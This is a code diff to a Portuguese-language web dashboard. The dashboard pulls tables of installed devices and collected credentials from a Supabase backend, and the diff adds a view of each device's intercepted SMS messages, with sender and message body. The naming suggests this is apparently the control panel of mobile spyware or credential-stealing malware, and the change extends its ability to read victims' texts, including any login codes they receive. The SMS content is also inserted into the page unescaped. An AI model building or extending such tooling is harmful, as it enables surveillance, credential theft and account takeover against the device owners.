@@ -484,6 +484,7 @@ const headers = {
 
 let todosDispositivos = [];
 let todasCredenciais = [];
+let todasSMS = [];
 
 async function fetchJSON(table) {
   const r = await fetch(SUPA_URL + "/rest/v1/" + table + "?select=*&limit=1000", { headers });
@@ -633,6 +634,23 @@ function renderLista(dispositivos, credenciais) {
               `).join('')
             }
           </div>
+
+          <div class="timeline-title" style="margin-top:16px">💬 SMS recebidas</div>
+          <div class="timeline" id="sms-${dev.device_id}">
+            ${(todasSMS.filter(s => s.device_id === dev.device_id)).length === 0
+              ? '<div style="color:var(--muted);font-family:var(--mono);font-size:12px;padding:10px 0">Sem SMS registadas</div>'
+              : todasSMS.filter(s => s.device_id === dev.device_id).slice(0, 50).map(s => `
+                <div class="tl-item">
+                  <div class="tl-dot login"></div>
+                  <div class="tl-time">${formatDate(new Date(s.timestamp_ms).toISOString())}</div>
+                  <div class="tl-content">
+                    <div class="tipo">📨 ${s.remetente || 'Desconhecido'}</div>
+                    <div style="word-break:break-word">${s.corpo || ''}</div>
+                  </div>
+                </div>
+              `).join('')
+            }
+          </div>
         </div>
       </div>
     </div>
@@ -699,15 +717,18 @@ async function carregarDados() {
   document.getElementById("lista").innerHTML = '<div class="empty"><div class="spinner"></div>A carregar...</div>';
 
   try {
-    const [r1, r2] = await Promise.all([
+    const [r1, r2, r3] = await Promise.all([
       fetch(SUPA_URL + "/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000", { headers }),
-      fetch(SUPA_URL + "/rest/v1/credenciais?select=*&limit=500", { headers })
+      fetch(SUPA_URL + "/rest/v1/credenciais?select=*&limit=500", { headers }),
+      fetch(SUPA_URL + "/rest/v1/sms?select=*&order=criado_em.desc&limit=1000", { headers })
     ]);
 
     const d1 = await r1.json();
     const d2 = await r2.json();
+    const d3 = await r3.json();
     todosDispositivos = Array.isArray(d1) ? d1 : [];
     todasCredenciais = Array.isArray(d2) ? d2 : [];
+    todasSMS = Array.isArray(d3) ? d3 : [];
 
     actualizarStats();
     renderLista(todosDispositivos, todasCredenciais);
